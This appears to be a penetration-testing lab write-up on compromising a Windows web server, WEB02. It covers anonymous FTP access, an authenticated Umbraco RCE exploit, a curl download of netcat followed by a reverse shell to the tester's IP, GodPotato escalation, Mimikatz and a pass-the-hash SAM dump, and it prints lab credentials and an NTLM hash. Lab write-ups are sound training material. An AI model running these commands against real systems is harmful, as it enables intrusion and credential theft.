# WEB02

## Enumeration

Host is located at `192.168.X.247`:

```
Nmap scan report for 192.168.200.247 (WEB02)
Host is up (0.052s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-title: RELIA - New Hire Information
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: RELIA - New Hire Information
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WEB02
|   NetBIOS_Domain_Name: WEB02
|   NetBIOS_Computer_Name: WEB02
|   DNS_Domain_Name: WEB02
|   DNS_Computer_Name: WEB02
|   Product_Version: 10.0.20348
|_  System_Time: 2024-07-28T19:44:55+00:00
| ssl-cert: Subject: commonName=WEB02
| Not valid before: 2024-04-14T08:04:56
|_Not valid after:  2024-10-14T08:04:56
|_ssl-date: 2024-07-28T19:45:22+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
14020/tcp open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf
|_ftp-bounce: bounce working!
14080/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=7/28%OT=80%CT=1%CU=34143%PV=Y%DS=4%DC=T%G=Y%TM=66A6
OS:9FD3%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=I%TS=A)SEQ(SP=107
OS:%GCD=2%ISR=10D%TI=I%TS=A)OPS(O1=M551NW8ST11%O2=M551NW8ST11%O3=M551NW8NNT
OS:11%O4=M551NW8ST11%O5=M551NW8ST11%O6=M551ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF
OS:%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M551NW8NNS%CC=Y%Q=)T
OS:1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T
OS:=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%
OS:UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=97F2%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-07-28T19:45:02
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
-   Hops 1-3 are the same as for 192.168.200.189
4   52.06 ms 192.168.200.247
```

### Anonymous Services

I tried RPC and SMB anonymously but no luck:

<figure><img src="../../../.gitbook/assets/Relia-WEB02-AnonServices.png" alt=""><figcaption><p>Unsuccessful anonymous login</p></figcaption></figure>



### Web Server (80 & 443)

<figure><img src="../../../.gitbook/assets/Relia-WEB02-Landing.png" alt=""><figcaption></figcaption></figure>

The three links on the left side go to PDFs. The PDFs do not contain anything interesting but the metadata reveals creators' names. 2 were created by a `zachary` and one by an `Emma`. These are added to `users.txt`:

{% code title="users.txt" %}
```
miranda
steven
mark
anita
offsec
peter
zachary
emma

```
{% endcode %}

### FTP (14020)

I see in the Nmap scan report that there is a single file here `umbraco.pdf`. I spend a bit trying to get an FTP client working and connected but I cannot. Ultimately I just [use `curl`](https://stackoverflow.com/a/42109807) to download the one file I need:

{% code overflow="wrap" %}
```bash
curl ftp://anonymous:anonymous@192.168.200.247:14020/umbraco.pdf -O
```
{% endcode %}

No helpful metadata this time but inside the PDF I find something potentially even more helpful. They appear to be instructions for installing [Umbraco](https://umbraco.com/) which is an open-source CMS. They give some credentials though:

<figure><img src="../../../.gitbook/assets/Relia-WEB02-PdfCreds.png" alt=""><figcaption><p>PDF containing creds</p></figcaption></figure>

I decide to test them hoping I just got lucky and that's his domain credentials and it turns out I did:

<figure><img src="../../../.gitbook/assets/Relia-MarkCme.png" alt=""><figcaption><p>Validating mark's credentials</p></figcaption></figure>

I stick this in `creds.txt`:

{% code title="creds.txt" %}
```
relia.com\mark:OathDeeplyReprieve91     Extracted from umbraco.pdf (WEB02)
```
{% endcode %}

#### Testing Credentials

I decide to cast a wider net and see if he has any SMB access anywhere else. It turns out he does not. Nor does he have WinRM on any of the machines accessible externally:

<figure><img src="../../../.gitbook/assets/Relia-MarkCmeWide.png" alt=""><figcaption><p>Testing credentials</p></figcaption></figure>

I also test them on the various web login portals I have found on `LOGIN` and `WEB01` but no luck there either. I am really beginning to think this will be a phishing thing.&#x20;

Finally I test them against the anonymous FTP locations in case there is more access for non-anonymous users but that fails as well.

## Foothold

I come back here after failing at phishing using `MAIL`. I totally ignored the fact that Umbraco is likely the CMS for the [site on this machine](web02.md#web-server-80-and-443) given what I found on the FTP site.



### Umbraco RCE

I do not see any command injection or upload points on the site itself. However I did find an authenticated RCE on Exploit-DB:

<figure><img src="../../../.gitbook/assets/Relia-SearchsploitUmbraco.png" alt=""><figcaption><p>RCEs for Umbraco</p></figcaption></figure>

At first when I was trying the exploit I assumed it was for the port 80 & 443 site but it kept failing. I determined it was because it could not find an expected URL at "`/umbraco/backoffice/UmbracoApi/Authentication/PostLogin`"

At first I tried enumerating the server better thinking there may be another path piece in front of `/umbraco/...` but I found nothing. I then realized that the Nmap report also included an HTTP service on a weird port of `14080`. This is also right next to the 14020 port where I found the `umbraco.pdf` file on FTP.

This seemed to resolve the issue but my commands were very limited as it errored with most commands including simple ones like `dir`:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>Failures</p></figcaption></figure>

I also could not get `whoami` to work if I ran it as `cmd /c whoami` which was concerning. Eventually I found [this post](https://stackoverflow.com/questions/2369119/error-in-process-start-the-system-cannot-find-the-file-specified) by googling part of the error message. It gave me a hint that it has to do with how the executable is being called and I started looking at the actual call in the code:

<figure><img src="../../../.gitbook/assets/Relia-WEB02-RceProblem.png" alt=""><figcaption><p>Creation of payload</p></figcaption></figure>

The payload itself is in C# (though the exploit is in Python). I realize I am incorrectly passing the whole "`cmd /c whoami`" as `args.command` instead of passing "`cmd`" as `args.command` and "`/c whoami`" as `args.arguments`. Once I correct this error more complex commands are possible:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption><p>Getting Exploit Working</p></figcaption></figure>

#### Getting Shell

I confirm the machine has curl.exe installed and I am able to download Netcat and use that to launch a shell:

{% code overflow="wrap" %}
```bash
./49488.py -i 'http://web02.relia.com:14080' -u 'mark@relia.com' -p 'OathDeeplyReprieve91' -c 'cmd' -a '/c curl http://192.168.45.154/windows/exe/networking/netcat_x64.exe -o C:\\Windows\\Temp\\nc.exe'
```
{% endcode %}

{% code overflow="wrap" %}
```bash
./49488.py -i 'http://web02.relia.com:14080' -u 'mark@relia.com' -p 'OathDeeplyReprieve91' -c 'cmd' -a '/c C:\\Windows\\Temp\\nc.exe -e cmd.exe 192.168.45.154 135'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/Relia-WEB02-UserShell.png" alt=""><figcaption></figcaption></figure>

User access achieved.

## Privilege Escalation

My user has `SeImpersonatePrivilege` and I am able to use GodPotato to get a `SYSTEM` reverse shell to port `8888`:

<figure><img src="../../../.gitbook/assets/Relia-WEB02-SystemShell.png" alt=""><figcaption><p>Starting elevated shell</p></figcaption></figure>

`SYSTEM` access achieved.

## Mimikatz

I run Mimikatz and find the Administrator's hash:

{% code overflow="wrap" %}
```
C:\Windows\Temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/Relia-WEB02-AdminHash.png" alt=""><figcaption><p>Administrator hash</p></figcaption></figure>

This is helpful for accessing the machine easily but it does not provide any lateral movement:

<figure><img src="../../../.gitbook/assets/Relia-WEB02-AdminHashCme.png" alt=""><figcaption><p>Administrator hash verification</p></figcaption></figure>

I can also use the hash to sign in with `evil-winrm`:

{% code overflow="wrap" %}
```bash
evil-winrm -i 192.168.198.247 -u 'Administrator' -H '2f2b8d5d4d756a2c72c554580f970c14'
```
{% endcode %}

This allows me to skip the song and dance of a shell.

## SAM Dump

I learned about the SAM [credential dumping technique for CME](https://crackmapexec.popdocs.net/use-cases/dump-credentials-with-crackmapexec) and as such I attempt to dump some hashes from `WEB02`:

{% code overflow="wrap" %}
```bash
crackmapexec smb 192.168.198.247 -u 'Administrator' -H '2f2b8d5d4d756a2c72c554580f970c14' --sam
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/Relia-WEB02-SamCme.png" alt=""><figcaption><p>SAM hashes dumped with CME</p></figcaption></figure>
